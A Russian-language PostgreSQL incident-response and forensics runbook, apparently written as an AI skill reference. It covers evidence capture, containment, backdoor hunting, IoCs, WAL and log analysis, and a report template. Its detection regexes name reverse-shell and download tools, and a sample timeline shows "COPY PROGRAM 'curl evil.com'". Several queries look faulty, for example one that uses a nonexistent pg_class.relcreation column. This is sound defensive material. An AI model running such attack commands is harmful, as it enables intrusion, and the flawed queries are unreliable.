# Реагирование на инциденты (forensic)

> **Содержание**
> 1. [Принципы реагирования](#принципы)
> 2. [Фаза 1: Идентификация](#identification)
> 3. [Фаза 2: Сдерживание (Containment)](#containment)
> 4. [Фаза 3: Эрадикация](#eradication)
> 5. [Фаза 4: Восстановление](#recovery)
> 6. [Фаза 5: Уроки](#lessons)
> 7. [IoC (Indicators of Compromise) для PostgreSQL](#ioc)
> 8. [Forensic-анализ WAL](#wal-forensic)
> 9. [Forensic-анализ логов](#logs-forensic)
> 10. [Forensic-анализ файлов](#files-forensic)
> 11. [Шаблон отчёта об инциденте](#отчёт)

---

## Принципы

При реагировании на инцидент с PostgreSQL:

1. **НЕ ВЫКЛЮЧАЙ сервер** сразу. Volatile evidence в `pg_stat_activity`,
   shared buffers, ОС-памяти будет потеряно.
2. **Snapshot диска прежде, чем что-либо менять**. Это сохранит состояние
   для последующего forensic-анализа.
3. **Изолируй, но не уничтожай**. Запрети новые подключения, но не убивай
   существующие сессии без дампа.
4. **Документируй каждое действие** с timestamp. В суде это будет
   доказательством.
5. **Chain of custody**. Если ведётся судебное дело — каждое действие с
   evidence должно быть подписано и датировано.

---

## Identification

### Признаки инцидента

- Аномальные подключения (новые IP, необычное время, необычные пользователи).
- Аномальные запросы (UNION, длинные строки, sleep).
- Рост CPU/IO без бизнес-причины.
- Изменения в `pg_extension`, `pg_roles`, `pg_hba.conf`.
- Удаление логов или их gap.
- Алерты SIEM на PostgreSQL-события.
- Жалобы пользователей на медленную работу (часто — побочный эффект атаки).
- Уведомление от третьих лиц (upstream provider, банк, leak site).

### Шаг 1: Snapshot volatile evidence

```sql
-- Активные сессии:
SELECT now(), datname, usename, application_name, client_addr, client_port,
       backend_start, xact_start, query_start, state_change, waiting,
       state, query
FROM pg_stat_activity
ORDER BY backend_start;

-- Блокировки:
SELECT now(), locktype, relation::regclass, pid, mode, granted, fastpath
FROM pg_locks
ORDER BY granted, mode;

-- Подключения по replication:
SELECT now(), * FROM pg_stat_replication;

-- Слоты репликации:
SELECT now(), * FROM pg_replication_slots;

-- Активные prepared transactions:
SELECT now(), * FROM pg_prepared_xacts;

-- Активные прослушивания NOTIFY:
SELECT now(), * FROM pg_listening_channels();

-- Текущие настройки:
SELECT now(), name, setting, source FROM pg_settings
WHERE source NOT IN ('default');

-- Установленные расширения:
SELECT now(), extname, extversion, extowner::regrole
FROM pg_extension;

-- Недавно созданные объекты:
SELECT now(), n.nspname, c.relname, c.relkind, c.relowner::regrole, c.relcreation
FROM pg_class c JOIN pg_namespace n ON n.oid = c.relnamespace
WHERE c.relcreation > now() - interval '7 days'
ORDER BY c.relcreation DESC;
```

```bash
# Сохранить в файл:
psql -c "SELECT * FROM pg_stat_activity" > /forensic/pg_stat_activity_$(date +%s).csv

# Дамп всех процессов postgres:
ps aux | grep postgres > /forensic/ps_postgres_$(date +%s).txt

# Сетевые соединения:
ss -tnp | grep 5432 > /forensic/ss_5432_$(date +%s).txt

# Логи:
cp -r /var/log/postgresql/ /forensic/logs_$(date +%s)/
```

### Шаг 2: Сохранить настройки ОС

```bash
# Загруженные модули ядра:
lsmod > /forensic/lsmod_$(date +%s).txt

# Sudoers:
cat /etc/sudoers /etc/sudoers.d/* > /forensic/sudoers_$(date +%s).txt 2>/dev/null

# Crontab postgres:
sudo -u postgres crontab -l > /forensic/crontab_postgres_$(date +%s).txt

# /etc/passwd изменения за последние 7 дней:
find /etc -type f -mtime -7 -ls > /forensic/etc_mtime_$(date +%s).txt

# Открытые файлы postgres-процессов:
for pid in $(pgrep postgres); do
  ls -la /proc/$pid/fd/ 2>/dev/null
done > /forensic/postgres_fds_$(date +%s).txt

# Process memory maps:
for pid in $(pgrep postgres); do
  cat /proc/$pid/maps 2>/dev/null
done > /forensic/postgres_maps_$(date +%s).txt
```

### Шаг 3: Snapshot диска

```bash
# AWS:
aws ec2 create-snapshot --volume-id vol-xxx --description "IR-snapshot-$(date +%s)"

# GCP:
gcloud compute disks snapshot pg-disk --snapshot-names ir-snapshot-$(date +%s)

# Azure:
az snapshot create -g rg --name ir-snapshot-$(date +%s) \
  --source /subscriptions/.../disks/pg-disk

# On-prem (LVM):
lvcreate -s -L 10G -n pg_snap_$(date +%s) /dev/vg0/pgdata

# Docker:
docker commit postgres-container ir-snapshot-$(date +%s)
docker save ir-snapshot-$(date +%s) -o /forensic/docker-snapshot.tar
```

---

## Containment

### Цель

Остановить распространение атаки, не уничтожая evidence.

### Шаг 1: Запретить новые подключения

```bash
# Без рестарта PostgreSQL:
sudo iptables -I INPUT -p tcp --dport 5432 -j DROP
# Существующие сессии остаются, новые не принимаются.

# Или через pg_hba.conf (требует reload, не restart):
echo "host all all 0.0.0.0/0 reject" | sudo tee -a /etc/postgresql/15/main/pg_hba.conf
sudo systemctl reload postgresql
```

### Шаг 2: Заблокировать скомпрометированные аккаунты

```sql
-- Если атакующий использует known-аккаунт:
ALTER ROLE compromised_user NOLOGIN;
-- Или сменить пароль:
ALTER ROLE compromised_user PASSWORD 'new_random_password';
-- Или установить срок действия в прошлое:
ALTER ROLE compromised_user VALID UNTIL 'yesterday';
```

### Шаг 3: Перевести БД в read-only

```sql
-- На уровне транзакций:
ALTER SYSTEM SET default_transaction_read_only = on;
SELECT pg_reload_conf();
-- Теперь все UPDATE/INSERT/DELETE возвращают ошибку.

-- Для полной блокировки DDL тоже:
ALTER SYSTEM SET default_transaction_deferrable = on;
```

### Шаг 4: Изолировать на сетевом уровне

```bash
# Удалить все правила, разрешающие 5432:
sudo iptables -F INPUT
sudo iptables -A INPUT -i lo -j ACCEPT
sudo iptables -A INPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT
sudo iptables -A INPUT -p tcp --dport 22 -s <admin-IP> -j ACCEPT
sudo iptables -A INPUT -j DROP
```

### Анти-пример: сразу kill всех сессий

```sql
SELECT pg_terminate_backend(pid) FROM pg_stat_activity WHERE pid != pg_backend_pid();
```

Если сделать это сразу — потеряешь evidence в памяти backend-процессов.
Сначала дамп `pg_stat_activity`, потом только kill.

---

## Eradication

### Цель

Удалить все следы атакующего, закрыть вектор атаки.

### Шаг 1: Найти и удалить backdoors

```sql
-- Поиск подозрительных функций:
SELECT n.nspname, p.proname, pg_get_function_arguments(p.oid),
       pg_get_userbyid(p.proowner) AS owner,
       p.prosecdef AS security_definer,
       p.proconfig
FROM pg_proc p
JOIN pg_namespace n ON n.oid = p.pronamespace
WHERE n.nspname NOT IN ('pg_catalog', 'information_schema')
  AND (
    p.proname ~* '(shell|exec|system|cmd|run|backdoor|reverse|c2|beacon)' OR
    p.prosrc ~* '(subprocess|os\.system|/bin/sh|bash -i|nc |netcat|/dev/tcp)' OR
    p.prosrc ~* '(curl |wget |powershell|certutil|bitsadmin)'
  )
ORDER BY p.proname;

-- Поиск расширений, которые не должны быть:
SELECT extname, extversion, extowner::regrole
FROM pg_extension
WHERE extname NOT IN ('plpgsql', 'pg_stat_statements', 'pgaudit', 'pgcrypto')
ORDER BY extname;

-- Поиск триггеров, которые могли быть установлены атакующим:
SELECT event_object_table, trigger_name, action_timing, event_manipulation,
       action_statement
FROM information_schema.triggers
WHERE trigger_name !~* '^(check_|validate_|update_|audit_)';

-- Поиск правил (RULES):
SELECT tablename, rulename, definition FROM pg_rules
WHERE rulename !~* '^(check_|validate_|audit_)';

-- Поиск VIEW с подозрительным определением:
SELECT schemaname, viewname, definition FROM pg_views
WHERE schemaname NOT IN ('pg_catalog', 'information_schema')
  AND definition ~* '(pg_read_file|lo_import|COPY|PROGRAM|dblink|/etc/)';
```

### Шаг 2: Найти и удалить несанкционированные роли

```sql
-- Все роли, созданные за последние 30 дней:
SELECT rolname, rolcreaterole, rolsuper, rolcreatedb, rolcanlogin,
       rolreplication, rolbypassrls
FROM pg_authid
WHERE rolname IN (
  SELECT rolname FROM pg_authid
  -- Нет поля creation_date в pg_authid. Использовать логи.
);

-- Из логов:
grep "CREATE ROLE" /var/log/postgresql/*.log | tail -50
```

### Шаг 3: Найти изменённые конфиги

```bash
# Сравнить с known-good копией:
diff /etc/postgresql/15/main/postgresql.conf /forensic/known_good/postgresql.conf
diff /etc/postgresql/15/main/pg_hba.conf /forensic/known_good/pg_hba.conf

# Найти изменённые файлы за последние 7 дней:
find /etc/postgresql/ -mtime -7 -ls
find /var/lib/postgresql/ -mtime -7 -ls 2>/dev/null

# FIM (File Integrity Monitoring):
sudo aide --check  # если установлен
```

### Шаг 4: Сменить ВСЕ пароли

```sql
-- Сгенерировать новые пароли для всех ролей:
SELECT format('ALTER ROLE %I PASSWORD %L;',
              rolname,
              encode(gen_random_bytes(24), 'hex'))
FROM pg_authid
WHERE rolcanlogin;

-- Выполнить вывод. Это сбросит все сессии с украденными паролями.
```

### Шаг 5: Ротация сертификатов

```bash
# Сгенерировать новый CA и server-сертификат:
cd /etc/postgresql/15/main/ssl/
openssl req -new -x509 -days 3650 -nodes -text \
  -out ca.pem -keyout ca-key.pem -subj "/CN=MyCompany PostgreSQL CA"
openssl req -new -nodes -text \
  -out server.csr -keyout server.key -subj "/CN=postgres.internal"
openssl x509 -req -in server.csr -text -days 365 \
  -CA ca.pem -CAkey ca-key.pem -CAcreateserial \
  -out server.crt
chmod 600 server.key
chown postgres:postgres server.key server.crt ca.pem
sudo systemctl restart postgresql
```

---

## Recovery

### Цель

Вернуть систему в нормальный режим, убедиться, что атакующий не вернётся.

### Шаг 1: Восстановить из чистого бэкапа

Если unsure в чистоте системы — лучше восстановить из known-good бэкапа:

```bash
# Найти последний known-good бэкап (ДО инцидента):
ls -la /backup/postgresql/

# Восстановить:
pg_ctl stop -D /var/lib/postgresql/15/main
mv /var/lib/postgresql/15/main /var/lib/postgresql/15/main.compromised
mkdir /var/lib/postgresql/15/main
chown postgres:postgres /var/lib/postgresql/15/main
# Распаковать бэкап:
tar -xzf /backup/postgresql/daily-2024-06-15.tar.gz -C /var/lib/postgresql/15/main
# Применить WAL (point-in-time recovery):
# Создать recovery.signal и настроить restore_command
pg_ctl start -D /var/lib/postgresql/15/main
```

### Шаг 2: Применить security patches

```bash
sudo apt update && sudo apt install postgresql-15
# Проверить версию:
psql -c "SELECT version();"
```

### Шаг 3: Усилить защиту

Применить все рекомендации из references этого скилла:
- `authentication_security.md` — SCRAM, pg_hba.
- `authorization_rls.md` — least privilege.
- `network_tls.md` — firewall, TLS.
- `filesystem_os.md` — REVOKE на dangerous functions.

### Шаг 4: Постепенно восстановить сервис

```bash
# Сначала разрешить подключения только от приложения:
sudo iptables -A INPUT -p tcp --dport 5432 -s 10.0.1.10 -j ACCEPT
# Мониторить логи 30 минут
# Если аномалий нет — разрешить остальным:
sudo iptables -A INPUT -p tcp --dport 5432 -s 10.0.1.0/24 -j ACCEPT
```

### Шаг 5: Уведомить stakeholders

- CISO / security team.
- Если есть утечка PII — DPO (Data Protection Officer), уведомить
  supervisory authority в течение 72 часов (GDPR Art. 33).
- Если есть утечка карточных данных — карточные бренды, acquiring bank.
- Клиентов (если их данные утекли) — в сроки, установленные законом.

---

## Lessons

После восстановления:
1. **Post-mortem документ**: что произошло, как, что сделали, что надо
   исправить.
2. **Update runbooks**: добавить процедуру для подобных инцидентов.
3. **Обучение персонала**: если был элемент человеческой ошибки.
4. **Дополнительные меры**: HIDS (AIDE), NIDS (Suricata), SIEM rules.
5. **Регулярные тренировки**: tabletop exercises раз в квартал.

---

## IoC

### Сетевые IoC

- Подключения с unusual IP (вне whitelist).
- Подключения в unusual время (ночью, выходные).
- Multiple failed logins с одного IP (>10/мин).
- Подключения с unusual User-Agent (libpq/0.0 — нестандартная версия).
- Исходящие соединения с сервера БД (postgresql не должен сам подключаться).

### SQL IoC (паттерны в логах)

```bash
# Поиск SQLi-паттернов в логах:
grep -E "UNION.*SELECT|SELECT.*FROM.*pg_shadow|pg_read_file|lo_import|COPY.*PROGRAM|dblink|plpython|plperl|/etc/passwd|/proc/self|sleep\(|waitfor delay|;.*DROP.*TABLE|;.*UPDATE.*SET" \
  /var/log/postgresql/*.log

# Поиск необычных DDL:
grep -E "CREATE (EXTENSION|FUNCTION|TRIGGER|RULE|LANGUAGE)" /var/log/postgresql/*.log | \
  grep -v "audit"

# Поиск ошибок аутентификации:
grep "FATAL: password authentication failed" /var/log/postgresql/*.log | \
  awk '{print $NF}' | sort | uniq -c | sort -rn | head -20

# Поиск подключений под суперпользователем извне:
grep -E "connection received: host=[^0]" /var/log/postgresql/*.log | \
  grep "user=postgres"
```

### Системные IoC

```bash
# Новые SUID-бинарники:
sudo find / -perm /4000 -type f -ls > /forensic/suid_now.txt
diff /forensic/suid_baseline.txt /forensic/suid_now.txt

# Новые crontab-записи:
sudo -u postgres crontab -l > /forensic/crontab_now.txt
diff /forensic/crontab_baseline.txt /forensic/crontab_now.txt

# Новые SSH-ключи:
find /home /var/lib/postgresql /root -name authorized_keys -ls
# Сравнить с baseline.

# Изменённые системные бинарники:
rpm -Va  # RHEL
debsums -c  # Debian

# Подозрительные процессы (через ps):
ps auxf | grep -vE "(postgres|systemd|sshd|cron|rsyslog)" | grep -E "(bash|sh|nc|ncat|python|perl)"
```

### PostgreSQL-специфичные IoC

```sql
-- Новые prepared transactions (могут быть от атакующего для persistance):
SELECT * FROM pg_prepared_xacts;

-- Аномальные size-ы таблиц (атакующий мог вставить много данных):
SELECT schemaname, relname, pg_size_pretty(pg_total_relation_size(relid)) AS size
FROM pg_stat_user_tables
ORDER BY pg_total_relation_size(relid) DESC
LIMIT 10;

-- Несоответствие между pg_database_size и размером на диске
-- (атакующий мог создать файлы вне PostgreSQL):
SELECT datname, pg_size_pretty(pg_database_size(datname)) AS db_size
FROM pg_database;

-- Неактивные replication slots (могут быть backdoor для exfil):
SELECT slot_name, plugin, slot_type, active, restart_lsn
FROM pg_replication_slots
WHERE NOT active;
```

---

## WAL-forensic

WAL (Write-Ahead Log) содержит все изменения данных. Даже если атакующий
удалил таблицу, в WAL остался след.

### Поиск в WAL

```bash
# Установка pg_waldump:
# (входит в postgresql-contrib)

# Просмотр WAL:
pg_waldump /var/lib/postgresql/15/main/pg_wal/000000010000000000000001 | less

# Поиск конкретной таблицы (через OID):
SELECT oid, relname FROM pg_class WHERE relname = 'users';
# Допустим, OID = 16384
pg_waldump /var/lib/postgresql/15/main/pg_wal/* | grep "rel 16384"
# Все WAL-записи, затрагивающие users table

# Поиск CREATE EXTENSION:
pg_waldump /var/lib/postgresql/15/main/pg_wal/* | grep -i "extension"

# Поиск INSERT/UPDATE/DELETE:
pg_waldump /var/lib/postgresql/15/main/pg_wal/* | grep -E "INSERT|UPDATE|DELETE"
```

### Timeline реконструкция

```bash
# Получить timeline всех транзакций за период:
pg_waldump --start=0/15000000 --end=0/16000000 \
  /var/lib/postgresql/15/main/pg_wal/000000010000000000000001 \
  | awk '{print $1, $2, $5}' > /forensic/wal_timeline.txt
# Анализировать timeline — увидеть, когда что менялось
```

---

## Logs-forensic

### Где логи PostgreSQL

```bash
# Debian/Ubuntu:
/var/log/postgresql/postgresql-15-main.log

# RHEL/CentOS:
/var/lib/pgsql/15/data/log/

# Из postgresql.conf:
sudo -u postgres psql -c "SHOW log_directory;"
sudo -u postgres psql -c "SHOW data_directory;"
```

### Что искать

```bash
# 1. Подключения (когда, кто, откуда):
grep "connection received" /var/log/postgresql/*.log

# 2. Отключения (длительность сессии):
grep "connection disallowed\|disconnection" /var/log/postgresql/*.log

# 3. Failed auth (brute-force):
grep "password authentication failed\|authentication failed" /var/log/postgresql/*.log

# 4. DDL (изменения схемы):
grep "AUDIT:.*DDL\|CREATE\|ALTER\|DROP\|TRUNCATE" /var/log/postgresql/*.log

# 5. Long queries (возможно, exploitation):
grep "duration:" /var/log/postgresql/*.log | awk -F'duration: ' '{print $2}' | \
  awk -F' ' '{print $1}' | sort -rn | head -20

# 6. Errors (возможно, exploit attempts):
grep "ERROR:" /var/log/postgresql/*.log

# 7. Что-то с pg_shadow:
grep "pg_shadow\|pg_authid" /var/log/postgresql/*.log
```

### Сравнение с baseline

```bash
# Сохранить baseline логов (нормальный паттерн):
# До инцидента — сохранить в /forensic/baseline/

# После инцидента — сравнить:
# Аномальные IP:
awk '/connection received/ {match($0, /host=([^ ]+)/, a); print a[1]}' /var/log/postgresql/*.log | \
  sort -u > /forensic/ips_incident.txt
comm -13 /forensic/baseline_ips.txt /forensic/ips_incident.txt
# Выведет НОВЫЕ IP

# Аномальные users:
awk '/connection received/ {match($0, /user=([^ ]+)/, a); print a[1]}' /var/log/postgresql/*.log | \
  sort -u > /forensic/users_incident.txt
comm -13 /forensic/baseline_users.txt /forensic/users_incident.txt
```

---

## Files-forensic

### Изменённые файлы

```bash
# Найти все файлы, изменённые за последние 24 часа:
find /var/lib/postgresql /etc/postgresql /var/log/postgresql -mtime -1 -ls

# Найти файлы, изменённые в подозрительное время (когда админ не работал):
find /var/lib/postgresql -newer /tmp/suspicious_time_marker -ls

# Сравнить с known-good:
sha256sum /etc/postgresql/15/main/postgresql.conf > /forensic/postgresql.conf.now.sha256
diff /forensic/baseline/postgresql.conf.sha256 /forensic/postgresql.conf.now.sha256
```

### Анализ дискового snapshot

```bash
# Смонтировать snapshot read-only:
sudo mount -o ro /dev/vg0/pg_snap_xxx /mnt/pg_snapshot

# Сравнить файлы:
diff -r /mnt/pg_snapshot/etc/postgresql/ /etc/postgresql/
diff -r /mnt/pg_snapshot/var/lib/postgresql/15/main/ /var/lib/postgresql/15/main/ \
  --brief | grep -v -E "(socket|pid|log)"

# Найти удалённые, но открытые файлы (deleted but in use):
sudo lsof +L1 | grep postgres
```

### Large objects

```sql
-- Если атакующий использовал lo_import — найти все large objects:
SELECT loid, pg_get_userbyid(lomowner) AS owner, lomacl, 
       pg_size_pretty(lo_size(loid)) AS size
FROM pg_largeobject_metadata
ORDER BY loid;

-- Прочитать содержимое подозрительного LO:
SELECT encode(lo_get(loid), 'escape') FROM pg_largeobject_metadata WHERE loid = 16384;
```

---

## Отчёт

Шаблон отчёта об инциденте:

```markdown
# Incident Report: [Incident ID]

## Executive Summary

Дата обнаружения: YYYY-MM-DD HH:MM TZ
Дата начала инцидента: YYYY-MM-DD HH:MM TZ (предположительно)
Дата завершения: YYYY-MM-DD HH:MM TZ
Severity: Critical / High / Medium / Low
Тип инцидента: SQLi / Misconfig / Insider / Unknown

## Timeline

| Time | Event | Evidence |
|------|-------|----------|
| 2024-06-15 03:14 | Необычный SELECT от user_app | pgAudit log line 1234 |
| 2024-06-15 03:15 | CREATE EXTENSION plpythonu | pgAudit log line 1240 |
| 2024-06-15 03:16 | COPY PROGRAM 'curl evil.com' | pgAudit log line 1242 |
| 2024-06-15 09:00 | Обнаружение (SIEM alert) | SIEM alert ID 5678 |
| 2024-06-15 09:05 | Идентификация, snapshot | AWS snapshot snap-xxx |
| 2024-06-15 09:30 | Containment (iptables block) | iptables log |
| 2024-06-15 11:00 | Eradication (DROP malicious functions) | SQL log |
| 2024-06-15 14:00 | Recovery (from backup) | backup log |

## Vectors

[Как атакующий получил доступ. Подробно.]

## Impact

- Затронутые данные: [список таблиц / записей]
- Количество записей: N
- Типы данных: PII / PCI / коммерческая тайна
- Длительность exposure: N часов

## Evidence

- pg_stat_activity dump: /forensic/pg_stat_activity_1718427600.csv
- Log excerpt: /forensic/logs_excerpt.txt
- WAL analysis: /forensic/wal_timeline.txt
- Disk snapshot: snap-xxx

## Root Cause Analysis

[Что позволило атаку. Подробно.]

## Remediation

- Patched: PostgreSQL 15.3 → 15.8
- pg_hba.conf: trust → scram-sha-256
- REVOKE на dangerous functions
- Added pgAudit
- Network isolation enforced

## Lessons Learned

- [Что улучшить в процессах]
- [Как быстрее обнаруживать]

## Notifications

- CISO: уведомлён 2024-06-15 09:30
- DPO: уведомлён 2024-06-15 10:00
- Supervisory authority (GDPR Art. 33): уведомлён 2024-06-15 12:00 (72h deadline)
- Customers: уведомлены 2024-06-15 18:00

## Sign-off

Incident Responder: [name], [date]
CISO: [name], [date]
```
